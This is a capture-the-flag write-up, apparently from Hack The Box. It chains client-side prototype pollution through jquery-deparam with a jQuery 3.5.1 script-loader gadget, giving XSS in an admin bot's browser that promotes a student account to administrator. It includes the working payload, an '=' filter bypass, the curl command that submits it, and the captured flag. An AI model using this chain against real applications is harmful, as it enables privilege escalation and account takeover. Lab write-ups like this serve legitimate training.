# Client-Side Prototype Pollution → XSS → Admin CSRF (33%)

## Target

Node.js/Express + PHP app. `profile.php` uses `jquery-deparam` to parse query string into object, then `$.getScript('http://prototypes.htb/devscript.js')` fails to load → triggers jQuery 3.5.1 script-loader gadget. Admin bot visits reported URLs.

## Vulnerability Chain

1. `deparam(location.search.slice(1))` parses `__proto__[onerror][]=PAYLOAD` → sets `Object.prototype.onerror = ["PAYLOAD"]`
2. jQuery 3.5.1 `$.getScript()` calls `jQuery("<script>").attr(s.scriptAttrs || {})` where `.attr({})` does `for...in {}` which enumerates inherited prototype property `onerror`
3. jQuery calls `elem.setAttribute('onerror', ["PAYLOAD"])` → array coerces to string → `<script onerror="PAYLOAD" src="http://prototypes.htb/devscript.js">`
4. Script fails (NXDOMAIN / ERR_BLOCKED_BY_ORB) → `onerror` fires → arbitrary JS executes as admin
5. XSS payload fetches `/admin.php?promote=2` → admin bot promotes htb-stdnt (id=2) to Administrator
6. Visit `/admin.php` as htb-stdnt → "Admin Info" section now visible → flag

## Critical Bug: deparam `=` Sign Splitting

`deparam` splits each parameter on ALL `=` signs: `var param = v.split('=')`. If payload contains `=` (e.g., `?promote=2`), it produces 3 elements → `param.length !== 2` → falls into "no value" branch → prototype pollution silently fails.

**Fix**: Avoid any `=` in the payload using `String.fromCharCode(61)`:

```javascript
fetch("/admin.php?promote".concat(String.fromCharCode(61),2))
```

## Exploit

```bash
# Register and log in (htb-stdnt / htb-stdnt)
# Get PHPSESSID, then submit poisoned link to admin bot:

curl -X POST "http://TARGET/profile.php" \
  -b "PHPSESSID=<SESSION>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'link=/profile.php?id=2&__proto__[onerror][]=fetch("/admin.php?promote".concat(String.fromCharCode(61),2))'

sleep 5

# Check /admin.php — Admin Info now shows the flag
curl "http://TARGET/admin.php" -b "PHPSESSID=<SESSION>"
```

## Result

`HTB{f92849aa47474fce058b0af0930eb4c7}`

## Key Notes

- Array notation `[]=` required: `Object.prototype.onerror = ["payload"]` bypasses jQuery's `attrHooks` `"set" in hooks` check — single-element array coerces to string when passed to `setAttribute`
- `__proto__[onerror][]` parsed by deparam as: `obj → obj.__proto__ → Object.prototype`, then `.onerror = []`, then `[0] = val`
- deparam `split('=')` bug means ANY `=` in payload value breaks pollution — use `String.fromCharCode(61)` or `\x3d` JS escape (verify shell doesn't interpret it)
- Admin bot firewall blocks all outbound HTTP — use relative (same-origin) URLs only
- The promote endpoint (`/admin.php?promote=N`) is a GET request requiring admin session — perfect CSRF via XSS since XSS runs in admin's browser
- After promoting, the session immediately reflects the role change — no re-login needed
